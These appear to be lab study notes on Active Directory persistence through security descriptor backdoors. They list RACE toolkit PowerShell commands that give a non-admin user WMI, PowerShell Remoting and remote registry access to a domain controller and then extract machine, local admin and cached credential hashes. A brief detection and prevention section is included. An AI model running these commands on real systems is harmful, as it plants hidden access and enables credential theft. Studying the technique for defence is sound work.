# Persistence — Security Descriptors Backdoor

**Date:** 07 August 2026


---

## What are Security Descriptors?

Security Descriptors define permissions on securable objects:
- **Owner** — who owns the object
- **Primary Group** — object's primary group
- **DACL** — Discretionary Access Control List (who can access)
- **SACL** — System Access Control List (auditing)

**Target objects:**
- WMI namespaces
- PowerShell Remoting
- Remote Registry
- Network shares
- Any securable object

---

## Why Security Descriptor Backdoors Work

✅ **Persistent** — survives reboots  
✅ **Silent** — no new accounts needed  
✅ **Invisible** — no group membership changes  
✅ **Non-admin** — backdoor user not privileged  
✅ **Multiple methods** — WMI, PS Remoting, Registry  

---

## SDDL Format (Security Descriptor Definition Language)

**ACE string format:**

```
ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
```

**Example (Administrators on WMI):**

```
A;CI;CCDCLCSWRPWPRCWD;;;SID
```

**Components:**
- `A` = Allow ACE
- `CI` = Container Inherit
- `CCDCLCSWRPWPRCWD` = Rights (create, delete, list, read, write, etc.)
- `SID` = Security Identifier of account

---

## Prerequisites

- **Domain Admin privileges** (to set security descriptors)
- **RACE toolkit** (`C:\AD\Tools\RACE-master\RACE.ps1`)
- **Admin access** on target machine (for remote modifications)

---

## Load RACE Toolkit

```powershell
. C:\AD\Tools\RACE-master\RACE.ps1
```

Dot-source RACE module to use cmdlets.

---

## Method 1: WMI Backdoor

**On local machine for student1:**

```powershell
Set-RemoteWMI -SamAccountName student1 -Verbose
```

Grants student1 WMI access on local machine.

---

**On remote machine without explicit credentials:**

```powershell
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
```

Grants student1 WMI access on dcorp-dc (root\cimv2 namespace).

---

**On remote machine with explicit credentials:**

```powershell
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator -Namespace 'root\cimv2' -Verbose
```

Use Admin credentials to grant access.

---

**Remove WMI permissions:**

```powershell
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose
```

Cleanup: Remove backdoor permissions.

---

## Use WMI Backdoor (As student1)

```powershell
Get-WmiObject -Class Win32_ComputerSystem -ComputerName dcorp-dc
```

Non-admin user can now access WMI.

---

## Method 2: PowerShell Remoting Backdoor

**Note:** Not stable after August 2020 patches (use with caution)

**On local machine for student1:**

```powershell
Set-RemotePSRemoting -SamAccountName student1 -Verbose
```

Grants student1 PS Remoting on local machine.

---

**On remote machine without credentials:**

```powershell
Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose
```

Grants student1 PS Remoting on dcorp-dc.

---

**Remove PS Remoting permissions:**

```powershell
Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove -Verbose
```

Cleanup: Remove backdoor permissions.

---

## Use PS Remoting Backdoor (As student1)

```powershell
Enter-PSSession -ComputerName dcorp-dc
```

Non-admin user can now remote access DC.

---

## Method 3: Remote Registry Backdoor

**Add registry backdoor (requires admin on remote machine):**

```powershell
Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
```

Grants student1 access to remote registry.

---

## Exploit Registry Backdoor (As student1)

**Retrieve machine account hash:**

```powershell
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```

Extract NTLM hash of DC machine account.

---

**Retrieve local account hash:**

```powershell
Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
```

Extract local Administrator NTLM hash.

---

**Retrieve domain cached credentials:**

```powershell
Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
```

Extract cached domain credentials (hashes of users who logged in).

---

## Attack Flow

```
1. Get Domain Admin privileges
   ↓
2. Load RACE toolkit
   ↓
3. Add backdoor (WMI, PS Remoting, or Registry)
   ↓
4. Remove DA privileges
   ↓
5. Backdoor user now has access
   ↓
6. Extract credentials or remote access
   ↓
7. Persistent access without admin rights
```

---

## Backdoor Comparison

| Method | Local Access | Remote Access | Extracts | Stable |
|---|---|---|---|---|
| WMI | Yes | Yes | Hashes | Yes |
| PS Remoting | Yes | Yes | Full shell | No (post-2020) |
| Registry | Yes | Yes | Local/cached/machine hashes | Yes |

---

## What Can Be Extracted via Registry

**Machine account hash:**
- DC machine account NTLM hash
- Used for pass-the-hash attacks
- Valuable for lateral movement

**Local Administrator hash:**
- DSRM admin on DC
- Local admin on other machines
- Can be used for pass-the-hash

**Domain cached credentials:**
- Hashes of users who logged into machine
- No password needed if user previously logged in
- Gold mine for credential extraction

---

## Detection & Prevention

**Detection:**
- Monitor security descriptor changes on securable objects
- Alert on WMI namespace permissions modifications
- Track PS Remoting ACL changes
- Monitor remote registry access attempts
- Event ID 4657 (registry value change)

**Prevention:**
- Restrict admin access
- Audit security descriptors regularly
- Use tiered admin model
- Monitor for unusual WMI/PS Remoting access
- Disable remote registry if not needed

---

## RACE Toolkit Requirements

```powershell
# RACE functions available after dot-sourcing:
. C:\AD\Tools\RACE-master\RACE.ps1

# WMI-related
Set-RemoteWMI
Get-RemoteWMI

# PS Remoting-related
Set-RemotePSRemoting

# Registry-related
Add-RemoteRegBackdoor
Get-RemoteMachineAccountHash
Get-RemoteLocalAccountHash
Get-RemoteCachedCredential
```

---

## Command Reference

| Task | Command |
|---|---|
| Load RACE | `. C:\AD\Tools\RACE-master\RACE.ps1` |
| WMI local backdoor | `Set-RemoteWMI -SamAccountName student1` |
| WMI remote backdoor | `Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2'` |
| Remove WMI backdoor | `Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Remove` |
| PS Remoting backdoor | `Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc` |
| Remove PS Remoting | `Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove` |
| Registry backdoor | `Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1` |
| Get machine hash | `Get-RemoteMachineAccountHash -ComputerName dcorp-dc` |
| Get local hash | `Get-RemoteLocalAccountHash -ComputerName dcorp-dc` |
| Get cached creds | `Get-RemoteCachedCredential -ComputerName dcorp-dc` |

---

## Persistence Techniques Summary

| Technique | Type | Duration | Access Level |
|---|---|---|---|
| Security Descriptor | Remote access | Indefinite | User (non-admin) |
| Custom SSP | Credential harvesting | Indefinite | Any logon |
| AdminSDHolder | Group permissions | Indefinite | Protected groups |
| ACL Rights Abuse | Domain object | Indefinite | Domain-wide |
| DSRM | Local backdoor | Indefinite | DC local admin |
| Skeleton Key | LSASS patch | Until reboot | Any user |

---

## Why Security Descriptors Are Effective

❌ **Non-admin backdoor** — user doesn't need admin privileges to use  
❌ **Multiple methods** — WMI, PS Remoting, Registry  
❌ **Persistent** — survives reboots and password changes  
❌ **Stealthy** — no new accounts or group membership  
❌ **Credential extraction** — access to hashes via registry  

---

## Key Takeaway

```
Modify Security Descriptors = Invisible backdoor
Non-admin user gets remote access
No group membership changes
No new accounts created
Extract hashes from registry
Perfect long-term persistence
```

---

## References

- [RACE Toolkit](https://github.com/samratashok/RACE)
- [DAMP](https://github.com/HarmJ0y/DAMP)
- [Security Descriptor Attacks (Harmj0y)](https://blog.harmj0y.net/redteaming/the-adminsdholder-trick/)

---

*Next: Cross-Forest Attacks & Cleanup*
